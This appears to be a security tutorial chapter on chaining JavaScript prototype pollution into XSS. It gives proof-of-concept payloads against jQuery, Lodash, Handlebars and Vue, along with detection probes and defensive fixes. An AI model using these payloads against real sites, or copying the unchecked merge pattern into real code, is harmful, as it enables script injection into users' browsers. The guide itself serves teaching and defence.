# 06 — Prototype Pollution → XSS

## Overview

Prototype pollution is a JavaScript vulnerability where user-controlled input modifies `Object.prototype`, making arbitrary properties available on every object in the application. When a rendering library or framework reads these properties without checking for own-property ownership, the polluted values reach dangerous sinks.

Prototype pollution does not directly inject HTML or execute code — it creates a precondition that another code path converts into XSS. The full chain is: **user input → `__proto__` pollution → library reads polluted property → XSS sink**.

---

## 1. How Prototype Pollution Works

```javascript
// Deep merge utility — common in many libraries
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];  // <-- no hasOwnProperty check
    }
  }
}

// Attacker-controlled JSON
const userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, userInput);

// Now every object has isAdmin === true
console.log({}.isAdmin);  // true
```

The key is that `for...in` traverses the prototype chain. When `key === '__proto__'`, `target[key]` reaches `Object.prototype` itself, and the assignment `target[key][property] = value` modifies the global prototype.

---

## 2. Full Exploitation Chains

### jQuery — innerHTML via Polluted `htmlPrefilter`

jQuery < 3.5.0 had a `htmlPrefilter` that could be polluted. More generally, jQuery reads prototype properties in several places.

```javascript
// Pollute a property jQuery uses for template resolution
Object.prototype.jquery = "3.4.0";
Object.prototype.fn = { extend: () => {} };
```

A more direct chain via `$.extend`:

```javascript
// Vulnerable deep merge via $.extend
$.extend(true, {}, JSON.parse('{"__proto__":{"onerror":"alert(1)"}}'));

// If any code later does:
$('<img>').attr(someAttrs);
// where someAttrs comes from an object that inherits onerror from prototype
// the onerror attribute gets set, triggering XSS
```

### Lodash Template — Direct Code Execution

Lodash `_.template` compiles template strings to `Function` calls. Properties read from the template data object include prototype properties.

```javascript
// Pollute the property used as template variable
Object.prototype.outputFunctionName = 'a=alert(1)//';

// Any subsequent lodash template compilation executes the pollution
_.template('')();  // alert(1) fires
```

**Affected version:** Lodash < 4.17.21 (CVE-2021-23337 and related)

```javascript
// Vulnerable code pattern
const compiled = _.template(userProvidedTemplate);
compiled(templateData);  // templateData's prototype is now attacker-controlled
```

### Handlebars — AST Injection via Prototype Pollution

Handlebars compiles templates into JavaScript functions. Prototype pollution can inject code into the compiled output.

```javascript
// Pollute properties used by Handlebars template AST
Object.prototype.pendingContent = 'alert(1)';

// When Handlebars compiles any template:
const template = Handlebars.compile('{{name}}');
template({ name: 'test' });  // executes alert(1)
```

**CVE:** CVE-2019-20920 (Handlebars prototype pollution)

### Vue.js — XSS via `v-html` and Polluted Props

In Vue.js applications using `v-html`, if an attacker can pollute a property that a component reads and passes to `v-html`, XSS occurs.

```javascript
// Attacker pollutes a Vue reactive property
Object.prototype.dangerousContent = '<img src=x onerror=alert(document.domain)>';

// Vue component template:
// <div v-html="userConfig.content"></div>
// If userConfig.content is undefined, Vue falls through to prototype:
// userConfig.content → Object.prototype.dangerousContent → XSS
```

---

## 3. Detecting Prototype Pollution

### Browser DevTools

```javascript
// After processing user input, check for pollution:
console.log(({}).pollutedKey);       // Should be undefined
console.log(Object.prototype);       // Inspect for unexpected properties

// Automated check:
Object.getOwnPropertyNames(Object.prototype).forEach(k => {
  if (!['constructor','hasOwnProperty','isPrototypeOf','propertyIsEnumerable',
        'toString','toLocaleString','valueOf','__defineGetter__',
        '__defineSetter__','__lookupGetter__','__lookupSetter__',
        '__proto__'].includes(k)) {
    console.warn('Prototype pollution detected:', k, Object.prototype[k]);
  }
});
```

### Burp Suite + DOM Invader

DOM Invader has a built-in prototype pollution scanner. Enable it via the DOM Invader panel → "Prototype pollution" mode. It automatically injects pollution probes into URL parameters, fragment, and postMessage data, then checks for property propagation.

### Manual Burp Testing

Send JSON payloads with `__proto__` in body parameters:

```json
{"__proto__": {"foo": "polluted"}}
{"constructor": {"prototype": {"foo": "polluted"}}}
```

Then verify with:

```javascript
// In browser console after the request:
({}).foo === 'polluted'  // true if pollution succeeded
```

---

## 4. Fixing Prototype Pollution

### Freeze Object.prototype

```javascript
// Apply at application startup — prevents modification of Object.prototype
Object.freeze(Object.prototype);
Object.freeze(Object.getPrototypeOf({}));
```

Limitation: some libraries use `Object.prototype` intentionally (e.g., for IE polyfills). Test thoroughly.

### Use null-Prototype Objects for User Data

```javascript
// Create objects with no prototype chain for user-controlled data
const userConfig = Object.create(null);
userConfig.name = userInput.name;
// userConfig.__proto__ === undefined — no prototype to pollute
```

### Validate Merge/Extend Input

```javascript
// Check for __proto__ and constructor before merging
function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;  // skip prototype-polluting keys
    }
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = target[key] || {};
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}
```

### Use hasOwnProperty Checks in Templates

```javascript
// Safe property access — does not traverse prototype chain
if (Object.prototype.hasOwnProperty.call(obj, 'key')) {
  render(obj.key);
}
```

---

## References

- [Prototype Pollution — Snyk Research](https://snyk.io/vuln/SNYK-JS-LODASH-450202)
- [CVE-2021-23337 Lodash Prototype Pollution](https://nvd.nist.gov/vuln/detail/CVE-2021-23337)
- [CVE-2019-20920 Handlebars Prototype Pollution](https://nvd.nist.gov/vuln/detail/CVE-2019-20920)
- [Prototype Pollution to XSS — PortSwigger Research](https://portswigger.net/research/widespread-prototype-pollution-gadgets)
- [Client-Side Prototype Pollution — BlackFan](https://github.com/BlackFan/client-side-prototype-pollution)
